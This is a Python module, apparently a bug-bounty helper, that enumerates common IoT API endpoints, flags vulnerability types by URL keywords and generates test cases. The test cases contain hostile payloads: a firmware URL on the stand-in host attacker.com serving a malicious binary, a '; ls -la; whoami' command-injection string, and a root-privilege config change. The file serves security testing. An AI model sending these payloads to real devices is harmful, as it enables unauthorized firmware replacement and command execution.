#!/usr/bin/env python3
"""
Copyright (c) 2025 YOUR_NAME_HERE
Proprietary and Confidential
All Rights Reserved

This software is proprietary and confidential.
Unauthorized copying, modification, or distribution is prohibited.

System ID: BB_20251102_5946
Owner: YOUR_NAME_HERE
"""

"""
IoT Vulnerability Scanner
Based on Practical IoT Hacking PDF methodology
Enhances bug bounty automation for IoT-related targets
"""

import json
import re
from typing import Dict, List, Any

class IoTVulnerabilityScanner:
    """
    IoT-specific vulnerability scanner
    Based on Practical IoT Hacking PDF methodology
    """
    
    # IoT-specific endpoints and patterns
    IOT_ENDPOINTS = [
        # Device Management
        "/api/device", "/api/devices", "/api/v1/device",
        "/api/firmware", "/api/update", "/api/ota",
        "/api/config", "/api/settings", "/api/management",
        
        # Telemetry & Data
        "/api/telemetry", "/api/data", "/api/metrics",
        "/api/sensor", "/api/sensors", "/api/status",
        
        # Control & Actuation
        "/api/control", "/api/command", "/api/action",
        "/api/execute", "/api/trigger",
        
        # Authentication
        "/api/auth", "/api/login", "/api/token",
        
        # Web Interfaces
        "/web", "/admin", "/config", "/setup",
        "/firmware", "/upgrade", "/update"
    ]
    
    # IoT-specific vulnerabilities
    IOT_VULNERABILITIES = {
        "weak_authentication": {
            "indicators": ["default", "admin", "root", "password"],
            "severity": "high",
            "description": "Weak or default authentication"
        },
        "firmware_exposure": {
            "indicators": ["firmware", "update", "ota", "binary"],
            "severity": "high",
            "description": "Exposed firmware files"
        },
        "unencrypted_communication": {
            "indicators": ["http://", "unencrypted", "plaintext"],
            "severity": "medium",
            "description": "Unencrypted communication"
        },
        "command_injection": {
            "indicators": ["command", "execute", "shell", "system"],
            "severity": "critical",
            "description": "Command injection in IoT commands"
        },
        "configuration_exposure": {
            "indicators": ["config", "settings", "backup"],
            "severity": "medium",
            "description": "Exposed configuration files"
        },
        "update_mechanism_vulns": {
            "indicators": ["update", "upgrade", "ota", "firmware"],
            "severity": "high",
            "description": "Vulnerable update mechanisms"
        }
    }
    
    @staticmethod
    def discover_iot_endpoints(base_urls: List[str]) -> List[str]:
        """Discover IoT-specific endpoints"""
        iot_endpoints = set()
        
        for base_url in base_urls:
            if not base_url.startswith(("http://", "https://")):
                base_url = f"https://{base_url}"
            
            for path in IoTVulnerabilityScanner.IOT_ENDPOINTS:
                iot_endpoints.add(f"{base_url.rstrip('/')}{path}")
        
        return sorted(iot_endpoints)
    
    @staticmethod
    def analyze_iot_response(response_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Analyze IoT endpoints for vulnerabilities"""
        findings = []
        
        url = response_data.get("url", "").lower()
        status_code = response_data.get("status-code", 0)
        
        # Check for IoT-specific vulnerabilities
        for vuln_type, details in IoTVulnerabilityScanner.IOT_VULNERABILITIES.items():
            for indicator in details["indicators"]:
                if indicator in url:
                    if status_code in [200, 201, 401, 403]:
                        findings.append({
                            "type": vuln_type,
                            "url": response_data.get("url", ""),
                            "severity": details["severity"],
                            "description": details["description"],
                            "iot_specific": True,
                            "recommendation": f"Test for {details['description']} vulnerabilities"
                        })
                    break
        
        return findings
    
    @staticmethod
    def generate_iot_test_cases(endpoint: str) -> List[Dict[str, Any]]:
        """Generate IoT-specific test cases"""
        test_cases = []
        
        url_lower = endpoint.lower()
        
        # Firmware update testing
        if any(indicator in url_lower for indicator in ["firmware", "update", "ota"]):
            test_cases.append({
                "type": "firmware_manipulation",
                "method": "POST",
                "endpoint": endpoint,
                "description": "Test firmware update manipulation",
                "payload": {"firmware_url": "http://attacker.com/malicious.bin"},
                "expected": "Unauthorized firmware update"
            })
        
        # Device control testing
        if any(indicator in url_lower for indicator in ["control", "command", "execute"]):
            test_cases.append({
                "type": "command_injection",
                "method": "POST",
                "endpoint": endpoint,
                "description": "Test command injection in device control",
                "payload": {"command": "; ls -la; whoami"},
                "expected": "Command execution"
            })
        
        # Configuration testing
        if "config" in url_lower or "settings" in url_lower:
            test_cases.append({
                "type": "config_manipulation",
                "method": "PUT",
                "endpoint": endpoint,
                "description": "Test configuration manipulation",
                "payload": {"admin": True, "privilege": "root"},
                "expected": "Unauthorized configuration changes"
            })
        
        return test_cases


# System ID: BB_20251102_5946
# Owner: YOUR_NAME_HERE
# Build Date: 2025-11-02 02:45:55
